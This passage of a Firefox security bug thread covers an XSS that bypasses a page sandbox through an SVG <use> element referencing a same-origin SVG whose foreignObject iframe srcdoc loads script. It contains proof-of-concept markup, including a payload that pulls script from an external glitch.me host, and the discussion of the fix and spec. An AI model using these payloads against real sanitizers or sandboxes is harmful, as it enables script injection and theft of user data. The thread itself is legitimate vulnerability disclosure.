<svg id="xss" xmlns="http://www.w3.org/2000/svg">;
<foreignObject>
<iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;body&gt;&lt;script src=https://notch-wood-soap.glitch.me/test2.js&gt;&lt;/script&gt;"></iframe>;
</foreignObject>
</svg>

```

Chrome and Safari will not load test2.js, Firefox will do it.

Changing the urls pointing to xss.svg cross domain would indeed block loading the svg.

The potential XSS is only part of the issue. The current behavior our Salesforce sandboxing framework with no many options other than preventing root functionality (e.g. svg loading) in Firefox.

Saying that, we appreciate all the support so far and we are looking forward to a good interoperable solution!

Flags: needinfo?(lbalter)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1754522#c15)• 3 years ago |
|  | |

(In reply to Leo Balter from [comment #14](/show_bug.cgi?id=1754522#c14 "RESOLVED FIXED - XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element"))

> This link is almost the same of the original example, but it changes the url to test2.js for a cross-domain one.

Sure, the cross-domain-ness of the script URL wouldn't matter (it rarely does for script tags, except for CSP and the like), the restriction [comment #6](/show_bug.cgi?id=1754522#c6 "RESOLVED FIXED - XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element"), 8 and 10 referenced is about the `href` of the `<use>` tag being same-origin, not the script tag inside the SVG referenced by that `use` tag.

> Chrome and Safari will not load test2.js, Firefox will do it.

To be clear, do they load the iframe or anything in it at all? I understood the answer to be "no", which means that where the script tag point isn't relevant - other browsers never get as far as the script tag.

> The potential XSS is only part of the issue. The current behavior our Salesforce sandboxing framework with no many options other than preventing root functionality (e.g. svg loading) in Firefox.

I'm still pretty confused at what you believe the root cause here to be. I understand that the result here is a security issue in the salesforce framework that affects customers. You believe this is a Firefox bug because the same testcase doesn't produce XSS in Chrome/Safari. What I don't understand is why the restriction on elements inside `<use>` is relevant here. Based on your description, the attacker controls the HTML that has the `<use>` and/or `<animate>` elements, can upload arbitrary SVG files onto the same domain (but isn't allowed to read cookies on that domain?), and there is no CSP that prevents subframes (which AIUI would prevent the issue here, Firefox bug or no). Why can't the attacker include the HTML `<iframe srcdoc>` directly, which would also work in Chrome/Safari, instead of jumping through the SVG+use+foreignObject hoops? Does the salesforce framework prevent the direct inclusion of an `iframe srcdoc` element in the initial HTML, but not the use of SVG <use> tags to include remote content? Why/how?

Flags: needinfo?(lbalter)Summary: XSS in SVG's iframe loaded from use and animate elements → XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element

|  | [Daniel Holbert [:dholbert]](/user_profile?user_id=278074) |  |
| --- | --- | --- |
| [Comment 16](/show_bug.cgi?id=1754522#c16)• 3 years ago |
|  | |

(In reply to Emilio Cobos Álvarez (:emilio) from [comment #12](/show_bug.cgi?id=1754522#c12 "RESOLVED FIXED - XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element"))

> I don't feel super-strongly either way. Perhaps we should just do [comment 7](/show_bug.cgi?id=1754522#c7 "RESOLVED FIXED - XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element") for compat with other engines. Jonathan / Robert / Daniel, do you have any strong opinions either way?

(No strong opinion; I agree with longsonr's [comment 13](/show_bug.cgi?id=1754522#c13 "RESOLVED FIXED - XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element").)

Flags: needinfo?(dholbert)

|  | [Leo Balter](/user_profile?user_id=693871)  Reporter |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1754522#c17)• 3 years ago |
|  | |

(In reply to :Gijs (he/him) from [comment #15](/show_bug.cgi?id=1754522#c15 "RESOLVED FIXED - XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element"))

> (In reply to Leo Balter from [comment #14](/show_bug.cgi?id=1754522#c14 "RESOLVED FIXED - XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element"))
>
> > This link is almost the same of the original example, but it changes the url to test2.js for a cross-domain one.
>
> Sure, the cross-domain-ness of the script URL wouldn't matter (it rarely does for script tags, except for CSP and the like), the restriction [comment #6](/show_bug.cgi?id=1754522#c6 "RESOLVED FIXED - XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element"), 8 and 10 referenced is about the `href` of the `<use>` tag being same-origin, not the script tag inside the SVG referenced by that `use` tag.

I agree with you about the restriction on the `<use>` tag, but for the script loaded inside I indeed refer to interoperability and did not have the chance yet to observe what's specified.

Blocking a cross domain xss.svg is already happening.

> > Chrome and Safari will not load test2.js, Firefox will do it.
>
> To be clear, do they load the iframe or anything in it at all? I understood the answer to be "no", which means that where the script tag point isn't relevant - other browsers never get as far as the script tag.

I don't see them rendering anything from the svg file, matching your intuition.

> > The potential XSS is only part of the issue. The current behavior our Salesforce sandboxing framework with no many options other than preventing root functionality (e.g. svg loading) in Firefox.
>
> I'm still pretty confused at what you believe the root cause here to be. I understand that the result here is a security issue in the salesforce framework that affects customers. You believe this is a Firefox bug because the same testcase doesn't produce XSS in Chrome/Safari. What I don't understand is why the restriction on elements inside `<use>` is relevant here. Based on your description, the attacker controls the HTML that has the `<use>` and/or `<animate>` elements, can upload arbitrary SVG files onto the same domain (but isn't allowed to read cookies on that domain?), and there is no CSP that prevents subframes (which AIUI would prevent the issue here, Firefox bug or no). Why can't the attacker include the HTML `<iframe srcdoc>` directly, which would also work in Chrome/Safari, instead of jumping through the SVG+use+foreignObject hoops? Does the salesforce framework prevent the direct inclusion of an `iframe srcdoc` element in the initial HTML, but not the use of SVG <use> tags to include remote content? Why/how?

The Salesforce platform allows the users to compose and customize their pages with multiple components published by us, them, and other clients. We have mechanisms that go beyond sanitizing code (e.g. sandboxing), and so we can exercise some control over inclusions such as new iframes. We got a specific bug reported for a code penetration from the SVG use/animate similarly to what we reported.

As [comment #9](/show_bug.cgi?id=1754522#c9 "RESOLVED FIXED - XSS in SVG's foreignObject with iframe, loaded through a same-origin SVG file from a <use> element") says, this is a way to bypass our sandboxing framework and the component would have access to the raw document. We don't necessarily prevent the inclusion of an `iframe srcdoc` but in general we also sandbox it within a virtualized environment that doesn't expose the main raw document.

The key request from us here is for interoperability. The cost complexity currently requires us to limit svg usage in Firefox and I hope we can avoid that and so we need your support here!

---

Saying all that, I appreciate all the attention so far! Please let me know if you need more clarification or information and I can get more engineer feedback from my end.

Flags: needinfo?(lbalter)

|  | [Leo Balter](/user_profile?user_id=693871)  Reporter |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1754522#c18)• 3 years ago |
|  | |

Friendly ping.

The respective team at Salesforce should have a workaround ready soon but it's mostly a limitation for our users. Please let me know if there is anything else we may provide. Thanks in advance!

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Assignee |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1754522#c19)• 3 years ago |
|  | |

I still think this is not really a Firefox bug, but oh well, I'm happy trying to land my patch for compat with other UAs given nobody has strongly objected.

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1754522#a1213181_600971)• 3 years ago |

Assignee: nobody → emilio
[Attachment #9263182](/attachment.cgi?id=9263182&action=edit "Bug 1754522 - Limit cross-document content loadable via <svg:use>. r=jwatt,longsonr") -
Attachment description: WIP: Bug 1754522 - Limit cross-document content loadable via <svg:use>. r=jwatt,longsonr → Bug 1754522 - Limit cross-document content loadable via <svg:use>. r=jwatt,longsonrStatus: NEW → ASSIGNED

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Assignee |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1754522#c20)• 3 years ago |
|  | |

SVG 2 is somewhat ambiguous on how stuff should work, FWIW. <https://www.w3.org/TR/SVG2/struct.html#UseShadowTree>:

> Previous versions of SVG restricted the contents of the shadow tree to SVG graphics elements. This specification allows any valid SVG document subtree to be cloned. Cloning non-graphical content, however, will not usually have any visible effect.

What that means for `<foreignObject>` is unclear.

|  | [Leo Balter](/user_profile?user_id=693871)  Reporter |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1754522#c21)• 3 years ago |
|  | |

I've been experimenting here and trying to reduce the problem. It seems like the difference comes begore the foreignObject.

```
<div>
  <p>
    svg 1
  </p>
  <svg id=s1 xmlns="http://www.w3.org/2000/svg" width="50" height="10">
    <use>
      <animate attributename="href" keytimes="0;0;1" values="foo;./something.svg#a;bar"></animate>
    </use>
  </svg>
</div>
<div>
  <p>
    svg 2
  </p>
  <svg id=s2 xmlns="http://www.w3.org/2000/svg" width="50" height="10">
    <use>
      <animate attributename="href" from="./something.svg#a" to=""></animate>
    </use>
  </svg>
</div>
<div>
  <p>
    svg 3
  </p>
  <svg id=s3 xmlns="http://www.w3.org/2000/svg" width="50" height="10">
    <use>
      <animate attributename="href" dur="1s" to="./something.svg#a"></animate>
    </use>
  </svg>
</div>

```

and the something.svg file:

```
<svg id="a" xmlns="http://www.w3.org/2000/svg" width="50" height="10">
  <line x1="0" y1="0" x2="50" y2="10" style="stroke:rgb(255,0,0);stroke-width:2"></line>
  <iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;body&gt;&lt;script src=./test2.js&gt;&lt;/script&gt;"></iframe>;
  <line x1="0" y1="10" x2="50" y2="0" style="stroke:rgb(255,0,0);stroke-width:2"></line>
</svg>

```

The lines may be rendered everywhere but *only Firefox will load the iframe*, regardless having a foreignObject or being within a web component. The following issue is that I can load a script from a different domain and still access my cookie values. Replacing the iframe part with:

```
<iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;body&gt;&lt;script src=https://notch-wood-soap.glitch.me/test2.js&gt;&lt;/script&gt;"></iframe>;

```

This happens regardless of being within a web component or a foreignObject.

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Assignee |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1754522#c22)• 3 years ago |
|  | |

Well, sure. Chromium / WebKit remove any non-SVG elements inside SVG `<use>`, and we don't. Per the quote above it seems SVG2 doesn't expect us to remove them but...

|  | [Leo Balter](/user_profile?user_id=693871)  Reporter |  |
| --- | --- | --- |
| [Comment 23](/show_bug.cgi?id=1754522#c23)• 3 years ago |
|  | |

I see the iframe being allowed in the foreignObject [here](https://www.w3.org/TR/SVG2/embedded.html#Placement) and IIUC, this must not require any specific extension.

I'm afraid to recognize this as a working as spec'ed even if the behavior requires me to run some workarounds from my end.

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Assignee |  |
| --- | --- | --- |
| [Comment 24](/show_bug.cgi?id=1754522#c24)• 3 years ago |
|  | |

So, SVG2 is not particularly clear on what should happen with `<iframe>`s. It is a bit weird that `<script>` would be inert (which is specified) but we'd allow `<iframe>` (which would be able to execute script).

I've filed a few issues with that text here:

* <https://github.com/w3c/svgwg/issues/876>
* <https://github.com/w3c/svgwg/issues/875>

Not sure if you can see the patch, but I think limiting the cross-document `<use>` behavior as per SVG 1.1 is a reasonable compromise for now, until the SVG 2 spec gets a bit more fleshed out with those details.

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1754522#a1402228_159069)• 3 years ago |

See Also: → [CVE-2022-34475](/show_bug.cgi?id=1757210 "VERIFIED FIXED - Bypass of HTML Sanitizer API using same origin use element")

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 25](/show_bug.cgi?id=1754522#c25)• 3 years ago |
|  | |

Limit cross-document content loadable via <svg:use>. r=dholbert

<https://hg.mozilla.org/integration/autoland/rev/ec9dae57453ce70ea13c913c7dc8ea9fd346fb3d>

<https://hg.mozilla.org/mozilla-central/rev/ec9dae57453c>

Group: layout-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 3 years ago
[status-firefox99](/buglist.cgi?f1=cf_status_firefox99&o1=isnotempty):
--- → [fixed](/buglist.cgi?f1=cf_status_firefox99&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → 99 Branch

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1754522#a1734864_75935)• 3 years ago |

[status-firefox97](/buglist.cgi?f1=cf_status_firefox97&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox97&o1=equals&v1=wontfix)
[status-firefox98](/buglist.cgi?f1=cf_status_firefox98&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox98&o1=equals&v1=wontfix)
[status-firefox-esr91](/buglist.cgi?f1=cf_status_firefox_esr91&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr91&o1=equals&v1=wontfix)Flags: in-testsuite+

|  | [Mihai Boldan, Desktop QA [:mboldan]](/user_profile?user_id=551058) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1754522#a2837305_551058)• 3 years ago |

QA Whiteboard: [post-critsmash-triage]Flags: qe-verify-

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1754522#a4060931_578488)• 3 years ago |

Whiteboard: [contributes to sec-high website vulns] → [contributes to sec-high website vulns][adv-main99+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 26](/show_bug.cgi?id=1754522#c26)• 3 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9269938)
— [Details](attachment.cgi?id=9269938&action=edit)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1754522#a4308756_578488)• 3 years ago |

Alias: CVE-2022-28284

|  | [Robert Longson [:longsonr]](/user_profile?user_id=218550) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=1754522#c27)• 3 years ago |
|  | |

[bug 1779834](/show_bug.cgi?id=1779834 "NEW - <animate> nodes not present when embedding SVGs via <use href>") and [bug 1776206](/show_bug.cgi?id=1776206 "NEW - SVG file mask not being loaded with <use>") are regressions from this via <https://searchfox.org/mozilla-central/source/dom/svg/SVGUseElement.cpp#294> Can we relax this requirement to any SVG safely rather than just SVGGraphicsElements? Happy to write such a patch in one of those bugs if so.

Flags: needinfo?(emilio)

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Assignee |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=1754522#c28)• 2 years ago |
|  | |

That'd be our own made-up thing, right? Right now the SVGGraphicsElement restriction comes from SVG1, and the no-restriction comes from SVG2. I'd rather not make up a new "mode" here tbh...

Flags: needinfo?(emilio)Regressions: [1779834](/show_bug.cgi?id=1779834 "NEW - <animate> nodes not present when embedding SVGs via <use href>"), [1776206](/show_bug.cgi?id=1776206 "NEW - SVG file mask not being loaded with <use>")

|  | [Robert Longson [:longsonr]](/user_profile?user_id=218550) |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=1754522#c29)• 2 years ago |
|  | |

In that case we should mark the other two bugs as wontfix or invalid.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1754522#a17232415_1689)• 2 years ago |

Whiteboard: [contributes to sec-high website vulns][adv-main99+] → [keep hidden while 1757210 is][contributes to sec-high website vulns][adv-main99+]

|  | [Jonathan Watt [:jwatt]](/user_profile?user_id=32767) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1754522#a18297912_32767)• 2 years ago |

Flags: needinfo?(jwatt)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1754522#a28840620_428608)• 2 years ago |

See Also: → [1806964](/show_bug.cgi?id=1806964 "RESOLVED FIXED - Restrict SVG `<use>` to prevent usage of `data:` URLs")

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1754522#a29496795_1689)• 2 years ago |

Group: core-security-release

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1754522#a79066475_546716)• 5 months ago |

See Also: → [1912763](/show_bug.cgi?id=1912763 "RESOLVED INVALID - Cross-document script can run in <use> element, through event handlers, when loaded through a same-origin (but cross-document) SVG file")
You need to [log in](/show_bug.cgi?id=1754522&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review


